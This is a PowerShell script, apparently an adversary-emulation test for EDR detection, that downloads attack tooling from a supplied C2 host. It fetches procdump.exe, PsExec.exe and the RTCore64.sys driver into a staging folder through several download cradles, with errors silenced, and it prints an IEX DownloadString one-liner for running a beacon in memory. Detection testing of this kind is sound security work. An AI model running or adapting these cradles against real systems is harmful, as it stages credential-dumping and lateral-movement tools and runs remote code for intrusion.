param(
    [Parameter(Mandatory=$true)]
    [string]$C2Host
)

$ErrorActionPreference = "SilentlyContinue"
Write-Host "[*] Starting LOLBin Download - PowerShell Cradles..." -ForegroundColor Cyan

# T1059.001 - PowerShell
# T1105 - Ingress Tool Transfer
# Multiple PowerShell download cradle techniques

Write-Host "[*] [T1059.001] PowerShell download cradles - multiple methods" -ForegroundColor Yellow
Write-Host "[!] C2 Server: http://$C2Host/tools/" -ForegroundColor Yellow

$stagingDir = "C:\temp\staging"
New-Item -ItemType Directory -Path $stagingDir -Force | Out-Null

# Method 1: Invoke-WebRequest (wget alias)
Write-Host "`n[*] Method 1: Invoke-WebRequest (wget/iwr)"
Write-Host "    CMD: Invoke-WebRequest -Uri http://$C2Host/tools/procdump.exe -OutFile $stagingDir\procdump.exe"
try {
    Invoke-WebRequest -Uri "http://$C2Host/tools/procdump.exe" -OutFile "$stagingDir\procdump.exe" -TimeoutSec 10
    if (Test-Path "$stagingDir\procdump.exe") {
        Write-Host "    [+] Download successful via IWR" -ForegroundColor Green
    }
} catch {
    Write-Host "    [-] Download failed: $($_.Exception.Message)" -ForegroundColor Red
}

# Method 2: System.Net.WebClient
Write-Host "`n[*] Method 2: System.Net.WebClient (DownloadFile)"
Write-Host "    CMD: (New-Object System.Net.WebClient).DownloadFile('http://$C2Host/tools/PsExec.exe', '$stagingDir\PsExec.exe')"
try {
    (New-Object System.Net.WebClient).DownloadFile("http://$C2Host/tools/PsExec.exe", "$stagingDir\PsExec.exe")
    if (Test-Path "$stagingDir\PsExec.exe") {
        Write-Host "    [+] Download successful via WebClient" -ForegroundColor Green
    }
} catch {
    Write-Host "    [-] Download failed: $($_.Exception.Message)" -ForegroundColor Red
}

# Method 3: DownloadString (in-memory execution)
Write-Host "`n[*] Method 3: In-Memory Download (DownloadString)"
Write-Host "    CMD: IEX (New-Object Net.WebClient).DownloadString('http://$C2Host/tools/beacon.ps1')"
Write-Host "    [!] This method downloads and executes directly in memory - no disk artifact" -ForegroundColor Yellow

# Method 4: Start-BitsTransfer
Write-Host "`n[*] Method 4: Start-BitsTransfer (PowerShell BITS)"
Write-Host "    CMD: Start-BitsTransfer -Source http://$C2Host/tools/RTCore64.sys -Destination $stagingDir\RTCore64.sys"
try {
    Start-BitsTransfer -Source "http://$C2Host/tools/RTCore64.sys" -Destination "$stagingDir\RTCore64.sys" -ErrorAction Stop
    if (Test-Path "$stagingDir\RTCore64.sys") {
        Write-Host "    [+] Download successful via BITS Transfer" -ForegroundColor Green
    }
} catch {
    Write-Host "    [-] Download failed: $($_.Exception.Message)" -ForegroundColor Red
}

# Summary of downloaded files
Write-Host "`n[*] Staged files summary:"
Get-ChildItem $stagingDir -ErrorAction SilentlyContinue | ForEach-Object {
    Write-Host "    [+] $($_.Name) ($($_.Length) bytes)" -ForegroundColor Green
}

Write-Host "`n[+] PowerShell Download Cradles Complete." -ForegroundColor Green
Write-Host "[!] Check EDR for: PowerShell downloading executables, AMSI triggers" -ForegroundColor Yellow
